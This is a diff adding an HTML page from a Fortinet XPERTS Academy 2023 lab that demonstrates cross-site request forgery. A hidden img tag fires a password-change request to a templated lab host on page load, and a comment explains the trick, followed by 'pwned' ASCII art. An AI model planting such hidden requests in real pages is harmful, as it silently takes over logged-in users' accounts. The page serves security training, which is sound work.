@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="description" content="Fortinet XPERTS Academy 2023 Hand on Labs">
+    <meta name="keywords" content="labs, training">
+    <title>CSRF Demo Page</title>
+    <style>
+		body {background-color: rgb(10, 123, 175); text-align: center; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }h1 { color: white; font-family: Arial, sans-serif; }h2 { color: rgb(60, 60, 60); font-family: Arial, sans-serif; }
+    </style>
+  </head>
+  <body>
+    <div>
+        <h1>Welcome to the XPERTS Academy 2023</h1>
+
+        <h2>Think this page is as innocent as a puppy?</h2>
+        <h2>Open the Developer Tools by selecting the 'Inspect' option and see for yourself - it's got some bite!</h2>
+
+        <!-- CSRF Demo via FortiWeb -->
+        <img style="display:none"
+            src="https://@PREFIX.@REGION.cloudapp.azure.com/vulnerabilities/csrf/?password_new=pwned&password_conf=pwned&Change=Change#"
+            alt="">
+    </div>
+
+    <!--THE MALICIOUS LINK IS EMBEDDED WITHIN AN `<IMG>` HTML TAG AND IS SET TO BE INVISIBLE USING THE `STYLE="DISPLAY:NONE"` ATTRIBUTE.
+        THIS MEANS THAT THE IMAGE WON'T BE VISIBLE ON THE WEBPAGE, BUT THE BROWSER WILL STILL TRY TO FETCH THE IMAGE SOURCE URL. THE URL
+        ACTUALLY POINTS TO A SCRIPT ON A DIFFERENT SERVER THAT EXPLOITS A CSRF VULNERABILITY BY CHANGING THE PASSWORD.
+
+        WHEN THE WEBPAGE CONTAINING THIS HIDDEN IMAGE TAG IS LOADED, THE BROWSER AUTOMATICALLY SENDS A REQUEST TO THE SPECIFIED URL. IF
+        THE USER IS ALREADY AUTHENTICATED ON THAT SITE, THE PASSWORD CHANGE REQUEST WILL BE EXECUTED WITHOUT THE USER'S EXPLICIT CONSENT,
+        EFFECTIVELY CHANGING THEIR PASSWORD TO "PWNED." THIS IS A SNEAKY WAY TO EXECUTE CSRF ATTACKS WITHOUT REQUIRING USER INTERACTION
+        WITH THE MALICIOUS ELEMENT, AS THE BROWSER AUTOMATICALLY PROCESSES THE `<IMG>` TAG.
+
+																													dddddddd
+																													d::::::d
+																													d::::::d
+																													d::::::d
+																													d:::::d
+		ppppp   pppppppppwwwwwww           wwwww           wwwwwwwnnnn  nnnnnnnn        eeeeeeeeeeee        ddddddddd:::::d
+		p::::ppp:::::::::pw:::::w         w:::::w         w:::::w n:::nn::::::::nn    ee::::::::::::ee    dd::::::::::::::d
+		p:::::::::::::::::pw:::::w       w:::::::w       w:::::w  n::::::::::::::nn  e::::::eeeee:::::ee d::::::::::::::::d
+		pp::::::ppppp::::::pw:::::w     w:::::::::w     w:::::w   nn:::::::::::::::ne::::::e     e:::::ed:::::::ddddd:::::d
+		 p:::::p     p:::::p w:::::w   w:::::w:::::w   w:::::w      n:::::nnnn:::::ne:::::::eeeee::::::ed::::::d    d:::::d
+		 p:::::p     p:::::p  w:::::w w:::::w w:::::w w:::::w       n::::n    n::::ne:::::::::::::::::e d:::::d     d:::::d
+		 p:::::p     p:::::p   w:::::w:::::w   w:::::w:::::w        n::::n    n::::ne::::::eeeeeeeeeee  d:::::d     d:::::d
+		 p:::::p    p::::::p    w:::::::::w     w:::::::::w         n::::n    n::::ne:::::::e           d:::::d     d:::::d
+		 p:::::ppppp:::::::p     w:::::::w       w:::::::w          n::::n    n::::ne::::::::e          d::::::ddddd::::::dd
+		 p::::::::::::::::p       w:::::w         w:::::w           n::::n    n::::n e::::::::eeeeeeee   d:::::::::::::::::d
+		 p::::::::::::::pp         w:::w           w:::w            n::::n    n::::n  ee:::::::::::::e    d:::::::::ddd::::d
+		 p::::::pppppppp            www             www             nnnnnn    nnnnnn    eeeeeeeeeeeeee     ddddddddd   ddddd
+		 p:::::p
+		 p:::::p
+		p:::::::p
+		p:::::::p
+		p:::::::p
+		ppppppppp
+
+    -->
+    <script src="/javascripts/extra.js"></script>
+</body>
+
+</html>
